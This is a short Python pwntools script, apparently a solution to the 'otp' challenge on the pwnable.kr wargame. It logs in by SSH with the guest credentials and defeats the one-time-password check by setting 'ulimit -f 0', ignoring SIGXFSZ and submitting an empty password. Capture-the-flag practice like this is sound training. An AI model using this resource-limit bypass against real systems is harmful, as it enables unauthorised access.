from pwn import *
from pwnlib import timeout 

print("logging ...(it might take some time)")
s = ssh(user="otp",host="pwnable.kr",port=2222,password="guest")

sh = s.shell("nc 0 10020")
print("\rConnected  Successefly")
sh.recv(timeout=1).decode()


sh.sendline(b"ulimit -f 0")
print(sh.recv(timeout=1).decode())

sh.sendline(b"trap '' XFSZ")
print(sh.recv(timeout=1).decode())

sh.sendline(b"./otp '' ")
print(sh.recv(timeout=1).decode())
